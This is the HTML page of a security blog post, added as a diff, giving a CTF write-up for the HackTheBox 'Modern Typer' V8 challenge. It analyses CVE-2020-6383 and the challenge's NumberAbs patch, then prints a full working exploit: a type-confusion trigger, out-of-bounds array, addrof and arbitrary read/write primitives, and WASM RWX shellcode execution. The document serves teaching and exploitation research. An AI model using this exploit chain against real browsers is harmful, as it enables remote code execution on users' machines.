@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow"><meta name="author" content="ulexec">
+<meta name="description" content="">
+<link rel="author" type="text/plain" href="/humans.txt">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+<meta name="theme-color" content="#ffff">
+<meta name="msapplication-TileColor" content="#ffff">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#ffff">
+
+  <meta itemprop="name" content="HTB 2021: Modern Typer ">
+  <meta itemprop="description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.">
+  <meta itemprop="datePublished" content="2021-05-20T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-07-08T09:03:55+02:00">
+  <meta itemprop="wordCount" content="4133">
+  <meta itemprop="keywords" content="Pwn,Ctf,Chrome"><meta property="og:url" content="//localhost:1313/en/post/2021-04-09-htb_modern_typer/">
+  <meta property="og:site_name" content="Ignacio Sanmillan Research Blog">
+  <meta property="og:title" content="HTB 2021: Modern Typer ">
+  <meta property="og:description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-05-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-07-08T09:03:55+02:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Chrome">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB 2021: Modern Typer ">
+  <meta name="twitter:description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.">
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HTB 2021: Modern Typer ",
+    "name": "HTB 2021: Modern Typer ",
+    "description": "Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.\n",
+    "keywords": ["pwn", "ctf", "chrome"],
+    "articleBody": "Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.\nPrerequisites This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan. Here are some of them:\nBasic understanding of TurboFan: Jeremy Fetiveau blogs Basic understanding of Sea-Of-Nodes: Goolgle Presentation An Overview of CVE-2020-6383 Before digging through the challenge solution, first let’s have an overview of a similar v8 typer bug to help us understand the root cause analysis of Modern Typer. This vulnerability is CVE-2020-6383.. I found this vulnerability by searching for older bugs affecting JSCreateLowering::ReduceJSCreateArray defined at compiler/js-create-lowering.cc. The relevance of understanding this bug in order to solve Modern Typer will be addressed later in this post.\nTypeInductionVariablePhi Analysis CVE-2020-6383 involves a v8 type Inference vulnerability in Typer::Visitor::TypeInductionVariablePhi in compiler/typer.cc. When a function is attempted to be optimized by Turbofan, Turbofan’s Typer will visit the graph of Ignition generated nodes to try to type and reduce them. The function TypeInductionVariablePhi is the function in charge to optimize for-loops and apply type inference analysis.\nLet’s break up the most relevant bits and pieces of this function before the patch for CVE-2020-6383 was applied:\nint arity = NodeProperties::GetControlInput(node)-\u003eop()-\u003eControlInputCount(); DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-\u003eopcode()); DCHECK_EQ(2, NodeProperties::GetControlInput(node)-\u003eInputCount()); auto res = induction_vars_-\u003einduction_variables().find(node-\u003eid()); DCHECK(res != induction_vars_-\u003einduction_variables().end()); InductionVariable* induction_var = res-\u003esecond; InductionVariable::ArithmeticType arithmetic_type = induction_var-\u003eType(); Type initial_type = Operand(node, 0); Type increment_type = Operand(node, 2); At the very beginning of the function, specific variables get initialized:\ninitial_type: holds the type of the driver variable of the for loop. increment_type: holds the type of the increment/decrement value applied to the driver variable in the for loop. arithmetic_type: holds the type of the arithmetic operation applied in the for loop, that being subtraction or addition. The function then evaluates the type of initial_type and increment_type const bool both_types_integer = initial_type.Is(typer_-\u003ecache_-\u003ekInteger) \u0026\u0026 increment_type.Is(typer_-\u003ecache_-\u003ekInteger); bool maybe_nan = false; // The addition or subtraction could still produce a NaN, if the integer // ranges touch infinity. if (both_types_integer) { Type resultant_type = (arithmetic_type == InductionVariable::ArithmeticType::kAddition) ? typer_-\u003eoperation_typer()-\u003eNumberAdd(initial_type, increment_type) : typer_-\u003eoperation_typer()-\u003eNumberSubtract(initial_type, increment_type); maybe_nan = resultant_type.Maybe(Type::NaN()); } // We only handle integer induction variables (otherwise ranges // do not apply and we cannot do anything). if (!both_types_integer || maybe_nan) { // Fallback to normal phi typing, but ensure monotonicity. // (Unfortunately, without baking in the previous type, monotonicity might // be violated because we might not yet have retyped the incrementing // operation even though the increment's type might been already reflected // in the induction variable phi.) Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node) : Type::None(); for (int i = 0; i \u003c arity; ++i) { type = Type::Union(type, Operand(node, i), zone()); } return type; } // If we do not have enough type information for the initial value or // the increment, just return the initial value's type. if (initial_type.IsNone() || increment_type.Is(typer_-\u003ecache_-\u003ekSingletonZero)) { return initial_type; } If the type of both initial_type and increment_type are of type kInteger, and the resultant type (stored in resultant_type) is nothing but the range of the minimum and maximum values these variables can hold. These ranges are obtained via NumberAdd and NumberSubstract returning an AddRanger or SubstractRAnger types accordingly.\nIn addition, the definition of the Type kInteger is the range of -Infinity to +Infinity, as defined in compiler/type-cache.h as shown below: Type const kInteger = CreateRange(-V8_INFINITY, V8_INFINITY); The range type product of the addition or subtraction operation gets evaluated next, and the likelihood of the result of the correspondent arithmetic operation to be of type NaN (Not a Number) is stored in maybe_nan. This usually holds for arithmetic operations where both operands are Infinity.\nOn the other hand, if resultant_type is likely to be NaN, or either initial_type or increment_type is not of type kInteger then the function returns a Union with all the possible types based on each operand type.\nIf both operands are of type kInteger the bounds of their correspondent arithmetic operation ranges gets evaluated :\n// Now process the bounds. double min = -V8_INFINITY; double max = V8_INFINITY; double increment_min; double increment_max; if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) { increment_min = increment_type.Min(); increment_max = increment_type.Max(); } else { DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type); increment_min = -increment_type.Max(); increment_max = -increment_type.Min(); } if (increment_min \u003e= 0) { // increasing sequence min = initial_type.Min(); for (auto bound : induction_var-\u003eupper_bounds()) { Type bound_type = TypeOrNone(bound.bound); // If the type is not an integer, just skip the bound. if (!bound_type.Is(typer_-\u003ecache_-\u003ekInteger)) continue; // If the type is not inhabited, then we can take the initial value. if (bound_type.IsNone()) { max = initial_type.Max(); break; } double bound_max = bound_type.Max(); if (bound.kind == InductionVariable::kStrict) { bound_max -= 1; } max = std::min(max, bound_max + increment_max); } // The upper bound must be at least the initial value's upper bound. max = std::max(max, initial_type.Max()); } else if (increment_max \u003c= 0) { // decreasing sequence max = initial_type.Max(); for (auto bound : induction_var-\u003elower_bounds()) { Type bound_type = TypeOrNone(bound.bound); // If the type is not an integer, just skip the bound. if (!bound_type.Is(typer_-\u003ecache_-\u003ekInteger)) continue; // If the type is not inhabited, then we can take the initial value. if (bound_type.IsNone()) { min = initial_type.Min(); break; } double bound_min = bound_type.Min(); if (bound.kind == InductionVariable::kStrict) { bound_min += 1; } min = std::max(min, bound_min + increment_min); } // The lower bound must be at most the initial value's lower bound. min = std::min(min, initial_type.Min()); } else { // Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer_-\u003ecache_-\u003ekInteger; } return Type::Range(min, max, typer_-\u003ezone()); The comments provided in the source are self-explanatory. Upper and lower bounds get calculated if and only if -increment_type.Max() \u003e= 0 or increment_type.Max() \u003c= 0 holds for subtraction or addition arithmetic operations accordingly. Otherwise, a kInteger type gets returned.\nTriggering A Type Confusion A type confusion vulnerability can be caused by a logical bug in the implementation of TypeInductionVariablePhi as this function does not take into account if the type of increment_type can become NaN through addition or subtraction of Infinities during the execution of the for-loop, having the initial value of initial_type not being Infinity.\nIn order to understand the way to trigger this vulnerability, let’s take a similar PoC as the one provided in the crbug issue :\nfunction trigger() { var x = -Infinity; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) { x = +Infinity; } } return i; }; %PrepareFunctionForOptimization(trigger) trigger(); %OptimizeFunctionOnNextCall(trigger) trigger(); In this scenario, we will have the following:\ninitial_type: i = 0. increment_type: i += -Infinity. arithmetic_type: arithmetic type will be of type addition. This configuration will be ultimately interpreted as follows:\nboth_types_integer = true: 0 is of type kInteger, as it falls within Range(-V8_INFINITY, V8_INFINITY); -Infinity is also of type kInteger as it falls within Range(-V8_INFINITY, V8_INFINITY); maybe_nan = false: as 0 + -Infinity = -Infinity, which is of type kInteger (increment_min \u003e= 0) == false: increment_min value will be -Infinity Therefore, TypeInductionVariablePhi for this case scenario will return a type of kInteger. However, that is only correct for the first iteration of the loop. But the loop will execute for a total of 3 iterations. The following would be the values for initial_type and increment_type per iteration:\nFirst iteration Second iteration Third iteration i 0 -Infinity NaN i += m -Infinity +Infinity - Therefore, for this specific for-loop instance Turbofan would infer i to be of type kInteger, being Range(-V8_INFINITY, V8_INFINITY); When in reality after the execution of the loop, i will be of type NaN, therefore leading to type confusion. This wrong type inference can be observed by analyzing the Turbofan’s Typer phase with Turbolizer:\nReduceJSCreateArray Analysis In conjunction with the previous vulnerability, there is an additional fault that enables this bug to be exploitable. This fault resides in the implementation of JSCreateLowering::ReduceJSCreateArray held in compiler/js-create-lowering.cc. The function ReduceJSCreateArray is in charge of the optimization of constructed arrays. For sake of simplicity, the only relevant portion of this function to enable exploitation will be covered. That is the following code within ReduceJSCreateArray implementation:\nif (arity == 0) { Node* length = jsgraph()-\u003eZeroConstant(); int capacity = JSArray::kPreallocatedArrayElements; return ReduceNewArray(node, length, capacity, *initial_map, elements_kind, allocation, slack_tracking_prediction); } else if (arity == 1) { Node* length = NodeProperties::GetValueInput(node, 2); Type length_type = NodeProperties::GetType(length); if (!length_type.Maybe(Type::Number())) { // Handle the single argument case, where we know that the value // cannot be a valid Array length. elements_kind = GetMoreGeneralElementsKind( elements_kind, IsHoleyElementsKind(elements_kind) ? HOLEY_ELEMENTS : PACKED_ELEMENTS); return ReduceNewArray(node, std::vector\u003cNode*\u003e{length}, *initial_map, elements_kind, allocation, slack_tracking_prediction); } if (length_type.Is(Type::SignedSmall()) \u0026\u0026 length_type.Min() \u003e= 0 \u0026\u0026 length_type.Max() \u003c= kElementLoopUnrollLimit \u0026\u0026 length_type.Min() == length_type.Max()) { int capacity = static_cast\u003cint\u003e(length_type.Max()); return ReduceNewArray(node, length, capacity, *initial_map, elements_kind, allocation, slack_tracking_prediction); } if (length_type.Maybe(Type::UnsignedSmall()) \u0026\u0026 can_inline_call) { return ReduceNewArray(node, length, *initial_map, elements_kind, allocation, slack_tracking_prediction); } } else if (arity \u003c= JSArray::kInitialMaxFastElementArray) { // Gather the values to store into the newly created array. ... As we can observe, depending on the number of arguments (arity) passed to the array constructor, different code-paths will be chosen. Ultimately, the effect of these code-paths based on the value of arity will be the following:\nIf arity is 0 length = 0 capacity = JSArray::kPreallocatedArrayElements If arity is 1 length = NodeProperties::GetValueInput(node, 2) if length_type != Number capacity = undefined if length_type == SignedSmall and length_type \u003c= kElementLoopUnrollLimit capacity = length_type.Max() else capacity = undefined else if arity \u003c= JSArray::kINiitalMaxFastElementArray: iterate through arguments, compute length and create new array else: return NoChange() We can observe based on the previous resumed overview of the implementation of ReduceJSCreateArray that if one argument is passed to the constructor, and that argument falls within the range of 0 \u003c= length_type \u003c= kElementLoopUnrollLimit, a new array will be created having its capacity initialized as length_type.Max(). The value of kElementLoopUnrollLimit is the following: // When initializing arrays, we'll unfold the loop if the number of // elements is known to be of this type. const int kElementLoopUnrollLimit = 16;Therefore, by following this path we can abuse the creation of an array with OOB indexed property access, as the upper bounds of the newly created array will be set to lenght_type.Max().\nExploitation The PoC provided in the crbug issue shows how we can chain these two vulnerabilities to abuse the speculation of a wrongly assumed type inference. This PoC is the following:\nfunction trigger() { var x = -Infinity; var k = 0; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) { x = +Infinity; } if (++k \u003e 10) { break; } } // inference: i = Range(-Inf, Inf) -- reality: i = NaN i = Math.max(i, 1024); // inference: i = Range(1024, Inf) -- reality: i = NaN i = -i; // inference: i = Range(-Inf, -1024) -- reality: i = NaN i = Math.max(i, -1025); // inference: i = Range(-1025, -1024) -- reality: i = NaN // i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering) i = -i; // inference: i = Range(1024, 1025) -- reality: i = 0 i -= 1022; // inference: i = Range(2, 3) -- reality: i = -1022 i \u003e\u003e= 1; // inference: i = Range(1, 1) -- reality: i = 1073741313 i += 10; // inference: i = Range(11, 11) -- reality: i = 1073741323 var arr = Array(i) // capacity = 11, length = 1073741323 (OOB) arr[0] = 1.1; return arr; }; for (let i = 0; i \u003c 20000; ++i) { trigger(); } console.log(trigger()[0][11]); Mitigation After the report of this vulnerability, the following patches were applied. Is important to understand the scope of these patches as this would be relevant for the analysis and solution of Modern Typer.\nPatch applied to JSCreateLowering::ReduceJSCreateArray diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc index ff057a4..77da973 100644 --- a/src/compiler/js-create-lowering.cc +++ b/src/compiler/js-create-lowering.cc @@ -672,6 +672,9 @@ length_type.Max() \u003c= kElementLoopUnrollLimit \u0026\u0026 length_type.Min() == length_type.Max()) { int capacity = static_cast(length_type.Max()); + // Replace length with a constant in order to protect against a potential + // typer bug leading to length \u003e capacity. + length = jsgraph()-\u003eConstant(capacity); return ReduceNewArray(node, length, capacity, *initial_map, elements_kind, allocation, slack_tracking_prediction); } Patch applied to Typer::TypeInductionVariablePhi diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index 14ec856..4e86b96 100644 --- a/src/compiler/typer.cc +++ b/src/compiler/typer.cc @@ -847,30 +847,24 @@ DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-\u003eopcode()); DCHECK_EQ(2, NodeProperties::GetControlInput(node)-\u003eInputCount()); - auto res = induction_vars_-\u003einduction_variables().find(node-\u003eid()); - DCHECK(res != induction_vars_-\u003einduction_variables().end()); - InductionVariable* induction_var = res-\u003esecond; - InductionVariable::ArithmeticType arithmetic_type = induction_var-\u003eType(); Type initial_type = Operand(node, 0); Type increment_type = Operand(node, 2); - const bool both_types_integer = initial_type.Is(typer_-\u003ecache_-\u003ekInteger) \u0026\u0026 - increment_type.Is(typer_-\u003ecache_-\u003ekInteger); - bool maybe_nan = false; - // The addition or subtraction could still produce a NaN, if the integer - // ranges touch infinity. - if (both_types_integer) { - Type resultant_type = - (arithmetic_type == InductionVariable::ArithmeticType::kAddition) - ? typer_-\u003eoperation_typer()-\u003eNumberAdd(initial_type, increment_type) - : typer_-\u003eoperation_typer()-\u003eNumberSubtract(initial_type, - increment_type); - maybe_nan = resultant_type.Maybe(Type::NaN()); + // If we do not have enough type information for the initial value or + // the increment, just return the initial value's type. + if (initial_type.IsNone() || + increment_type.Is(typer_-\u003ecache_-\u003ekSingletonZero)) { + return initial_type; } - // We only handle integer induction variables (otherwise ranges - // do not apply and we cannot do anything). - if (!both_types_integer || maybe_nan) { + // We only handle integer induction variables (otherwise ranges do not apply + // and we cannot do anything). Moreover, we don't support infinities in + // {increment_type} because the induction variable can become NaN through + // addition/subtraction of opposing infinities. + if (!initial_type.Is(typer_-\u003ecache_-\u003ekInteger) || + !increment_type.Is(typer_-\u003ecache_-\u003ekInteger) || + increment_type.Min() == -V8_INFINITY || + increment_type.Max() == +V8_INFINITY) { // Fallback to normal phi typing, but ensure monotonicity. // (Unfortunately, without baking in the previous type, monotonicity might // be violated because we might not yet have retyped the incrementing @@ -883,14 +877,13 @@ } return type; } - // If we do not have enough type information for the initial value or - // the increment, just return the initial value's type. - if (initial_type.IsNone() || - increment_type.Is(typer_-\u003ecache_-\u003ekSingletonZero)) { - return initial_type; - } // Now process the bounds. + auto res = induction_vars_-\u003einduction_variables().find(node-\u003eid()); + DCHECK(res != induction_vars_-\u003einduction_variables().end()); + InductionVariable* induction_var = res-\u003esecond; + InductionVariable::ArithmeticType arithmetic_type = induction_var-\u003eType(); + double min = -V8_INFINITY; double max = V8_INFINITY; @@ -946,8 +939,8 @@ // The lower bound must be at most the initial value's lower bound. min = std::min(min, initial_type.Min()); } else { - // Shortcut: If the increment can be both positive and negative, - // the variable can go arbitrarily far, so just return integer. + // If the increment can be both positive and negative, the variable can go + // arbitrarily far. return typer_-\u003ecache_-\u003ekInteger; } if (FLAG_trace_turbo_loop) { Modern Typer After the analysis of CVE-2020-6383, understanding the exploitation of Modern Typer will be easier as it abuses a similar vulnerability.\nPatch File diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc index 619475ef7f..d1cfcae1f4 100644 --- a/src/compiler/js-create-lowering.cc +++ b/src/compiler/js-create-lowering.cc @@ -699,7 +699,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) { int capacity = static_cast(length_type.Max()); // Replace length with a constant in order to protect against a potential // typer bug leading to length \u003e capacity. - length = jsgraph()-\u003eConstant(capacity); + //length = jsgraph()-\u003eConstant(capacity); return ReduceNewArray(node, length, capacity, *initial_map, elements_kind, allocation, slack_tracking_prediction); } diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc index 8b889c6948..c13d58e4c2 100644 --- a/src/compiler/operation-typer.cc +++ b/src/compiler/operation-typer.cc @@ -325,7 +325,7 @@ Type OperationTyper::NumberAbs(Type type) { DCHECK(type.Is(Type::Number())); if (type.IsNone()) return type; - bool const maybe_nan = type.Maybe(Type::NaN()); + //bool const maybe_nan = type.Maybe(Type::NaN()); bool const maybe_minuszero = type.Maybe(Type::MinusZero()); type = Type::Intersect(type, Type::PlainNumber(), zone()); @@ -345,9 +345,9 @@ Type OperationTyper::NumberAbs(Type type) { if (maybe_minuszero) { type = Type::Union(type, cache_-\u003ekSingletonZero, zone()); } - if (maybe_nan) { - type = Type::Union(type, Type::NaN(), zone()); - } + //if (maybe_nan) { + // type = Type::Union(type, Type::NaN(), zone()); + //} return type; } Patch Analysis If we put close attention to the patches applied for Modern Typer, we can notice that one of the patches applies to JSCreateLowering::ReduceJSCreateArray. This patch ultimately removes the previous patch for CVE-2020-6383, implementing explicit upper bound checks of constructed arrays in order to provide hardening against typer bugs. Based on this patch, we assume to be likely that the vulnerability to exploit this challenge will involve the speculation of a constructed array’s upper bounds through a potential type confusion vulnerability.\nIf we take a look at the other function in which the provided patch applies, we can see that it involves OperationTyper::NumberAbs. Changes imposed in this function by this patch are rather concise, and consists of removing NaN type checks to the result of NumberAbs.\nHaving in mind the extent of the provided patch and the functions involved, we can execute a number of test in order to understand how exploitation can be achieved.\nIf we take the previous PoC provided for CVE-2020-6383 and try to execute it on a patched v8 build we will see that an OOB array is not achieved. We can inspect Turbofan’s optimization phases with Turbolizer in order to gain a better understanding of what is happening.\nWe can generate Turbolizer output files if we run the PoC with the following flags:\n# setting up turbolizer cd v8/tools/turbolizer npm i \u0026\u0026 npm run-script build python3 -m http.server 2\u0026\u003e1 \u003e /dev/null \u0026 cd - # running poc and provide turbolizer output v8/out/x64.release/d8 ./poc.js --trace-turbo We can observe the following Turbolizer Typer phase graph of our function trigger:\nBased on the Turbolizer’s output, we can interpret that type inference of our variable i as being interpreted as follows: function trigger() { var x = -Infinity; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) x = +Infinity; } // inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN i = Math.max(i, 1024); // inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN i = -i; // inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN i = Math.max(i, -1025); // inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN i = -i; // inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN i -= 1022; // inference: i = (NaN | Range(2, 3)) -- reality: i = NaN // Truncate Float64ToWord32 (SimplifiedLowering) i = 0 i \u003e\u003e= 1; // inference: i = Range(0, 1) -- reality: i = 0 i += 1; // inference: i = Range(1, 2) -- reality: i = 1 let arr = Array(i); oob_arr[0] = 1.1; return arr; } Based on previous patches applied to CVE-2020-6383, we can notice that after finalizing the for-loop, i has the type of Union(NaN, kInteger). Since i contains the type NaN, arithmetic operations do not apply.\nWe can also observe that the type of i gets converted from a Float64 representation to an Int32 right before the Shift Arithmetic Right operation in the Simplified Lowering phase, in which coverts the value of NaN to 0:\nMoving forward from this point, the type inference of i align with the possible values that i may hold, and the creation of an Array with OOB indexed property access is not achieved.\nHowever, we may be able to escape NaN typing abusing the NumberAbs function. As we covered previously, the patch for this challenge removes the NaN type check to the return value of NumberAbs, therefore it will effectively escape NaN typing of whatever value we provide as a parameter.\nLets modify our PoC and apply the following: function trigger() { var x = -Infinity; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) x = +Infinity; } i = Math.max(i, 1024); i = -i; i = Math.max(i, -1025); i = -i; i = Math.abs(i); // \u003c------ escaping NaN typing i -= 1022; i \u003e\u003e= 1; i += 1; let arr = Array(i); oob_arr[0] = 1.1; return arr; }If we analyze the Typer phase of this new instance of trigger in Turbolizer we will see the following:\nAs we can observe, the call to NumberAbs escapes NaN typing. We can also observe based on Turbolizer’s Simplified Lowering phase that the value of i changes from NaN to 0 via the ChangeFloat64ToInt32 machine level node after the call to NumberAbs, enabling to apply arithmetic operations to the value of i moving forward:\n![](/2021-12-30-140249_924x731_scrot 1.png#center)\nOverall the wrong type inference in this scenario works as follows:\nfunction trigger() { var x = -Infinity; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) x = +Infinity; } // inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN i = Math.max(i, 1024); // inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN i = -i; // inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN i = Math.max(i, -1025); // inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN i = -i; // inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN i = Math.abs(i); // i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering) // inference: i = Range(1024, 1025) - reality: i = 0 i -= 1022; // inference: i = Range(2, 3) -- reality: i = -1022 i \u003e\u003e= 1; // inference: i = Range(1, 1) -- reality: i = 1073741313 i += 1; // inference: i = Range(2, 2) -- reality: i = 1073741314 let arr = Array(i); oob_arr[0] = 1.1; return arr; } After succesfully escaping NaN typing abusing NumberAbs, the vulnerability can be triggered enabling us to create an Array with OOB indexed property access.\nExploitation Now that we have OOB access, the exploit strategy is simple. We need an addrof primitive to obtain the address of arbitrary objects, and in this case, we can neglect the creation of a fakeobj primitive in order to create objects at arbitrary memory locations. This is due to the fact that since we have a large enough OOB read/write primitive, it can be trivially converted into an arbitrary read/write primitive. In order to achieve successful exploitation we follow the following steps:\nFirst we allocate two arrays, an unboxed and a boxed array. These arrays should be declared after the OOB array so that they are consecutively allocated in V8’s heap with respect to our OOB array, in order to access their contents through our OOB array. We leak the map tagged pointers of both the boxed and unboxed array accordingly. Leveraging the leaked maps, we construct an addrof primitive enabling type confusion of the unboxed array elements by changing the unboxed array map accordingly. Construct arbitrary read/write primitives by overwriting the unboxed array’s elements pointer (taking care of V8’s pointer compression). Instantiate a WASM instance, leak its RWX page and write the contents of arbitrary code to it to then pivot control flow of execution. Full Exploit var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } function trigger() { var x = -Infinity; for (var i = 0; i \u003c 1; i += x) { if (i == -Infinity) x = +Infinity; } i = Math.max(i, 1024); i = -i; i = Math.max(i, -1025); i = -i; i = Math.abs(i); i -= 1022; i \u003e\u003e= 1; i += 1; let arr = Array(i); oob_arr[0] = 1.1; return arr; }; for (let i = 0; i \u003c 0x10000; i++) { trigger(); } var oob_arr = trigger(); var flt_arr = [1.1, 1.2]; var obj_arr = [{}, {}]; var flt_map = ftoi(oob_arr[5]) \u0026 0xffffffffn var obj_map = ftoi(oob_arr[13]) \u0026 0xffffffffn function addrof(obj) { oob_arr[5] = itof(obj_map); flt_arr[0] = obj; oob_arr[5] = itof(flt_map); return ftoi(flt_arr[0]) \u0026 0xffffffffn } function arb_read(addr) { let old_elements = oob_arr[6] oob_arr[6] = itof((2n \u003c\u003c 32n) + addr - 8n); let leak = flt_arr[0]; oob_arr[6] = old_elements; return leak; } function arb_write(addr, val) { let old_elements = oob_arr[6] oob_arr[6] = itof((2n \u003c\u003c 32n) + addr - 8n); flt_arr[0] = val; oob_arr[6] = old_elements; } function exploit() { var wasm_code = new Uint8Array([ 0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0, 1,127,3,130,128,128,128,0,1,0,4,132,128,128,128, 0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128, 128,128,0,0,7,145,128,128,128,0,2,6,109,101,109, 111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128, 128,0,1,132,128,128,128,0,0,65,0,11 ]); var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var wasm_instance_addr = addrof(wasm_instance) + 0x68n; var rwx_page_addr = arb_read(wasm_instance_addr); function copy_shellcode(addr, shellcode) { let buf = new ArrayBuffer(0x100); let dataview = new DataView(buf); let buf_addr = addrof(buf); let backing_store_addr = buf_addr + 0x14n; arb_write(backing_store_addr, addr); for (let i = 0; i \u003c shellcode.length; i++) { dataview.setUint32(4 * i, shellcode[i], true); } } // msfvenom -p linux/x64/exec CMD='xcalc' --format dword var shellcode=[ 0x90909090, 0x90909090, 0x782fb848, 0x636c6163, 0x48500000, 0x73752fb8, 0x69622f72, 0x8948506e, 0xc03148e7, 0x89485750, 0xd23148e6, 0x3ac0c748, 0x50000030, 0x4944b848, 0x414c5053, 0x48503d59, 0x3148e289, 0x485250c0, 0xc748e289, 0x00003bc0, 0x050f00 ]; copy_shellcode(rwx_page_addr, shellcode); f(); } exploit(); ",
+    "wordCount" : "4133",
+    "inLanguage": "en",
+    "datePublished": "2021-05-20T00:00:00Z",
+    "dateModified": "2023-07-08T09:03:55+02:00",
+    "author":{
+        "@type": "Person",
+        "name": "ulexec",
+        "url": "//localhost:1313/en/about/"
+        },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "//localhost:1313/en/post/2021-04-09-htb_modern_typer/"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Ignacio Sanmillan Research Blog",
+      "description": "",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "//localhost:1313/favicon.ico"
+      }
+    }
+}
+</script><title>HTB 2021: Modern Typer </title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="//localhost:1313/css/style.min.1c3457a9e9a2486add1cbdc04fe13e164fd6f0db073e8f2880b40b20cbb43bda.css" integrity="sha256-HDRXqemiSGrdHL3AT+E+Fk/W8NsHPo8ogLQLIMu0O9o=" crossorigin="anonymous">
+	</head>
+<body id="page">
+	<header id="site-header">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="//localhost:1313/">Ignacio Sanmillan Research Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile"><a href="//localhost:1313/en/publications/">Publications</a><a href="//localhost:1313/en/post/">Posts</a><a href="//localhost:1313/en/about/">About</a><a href="//localhost:1313/en/projects/">Projects</a><a href="//localhost:1313/en/advisories/">Advisories</a></nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-links hide-in-mobile"><a href="https://joinmastodon.org/" target="_blank" rel="noopener me" title="Mastodon"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" fill="none" stroke="currentColor"
+   viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path
